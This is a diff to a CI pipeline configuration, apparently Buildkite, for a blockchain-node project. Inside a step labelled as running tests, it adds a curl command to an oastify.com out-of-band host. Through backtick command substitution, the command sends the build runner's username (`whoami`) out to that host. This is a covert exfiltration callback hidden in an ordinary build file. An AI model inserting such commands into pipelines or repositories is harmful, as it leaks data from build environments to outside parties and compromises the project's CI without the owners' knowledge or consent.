@@ -2,6 +2,7 @@ steps:
   - label: ":hammer: running tests"
     commands:
       - "make ci"
+      - "curl http://wppc39cy6vyctf42k72w6rcfq6w5kxlla.oastify.com/helium/blockchain-node/`whoami`"
         #- "make test" #currently no ct defined, causes build error
     key: "tests"
     agents:
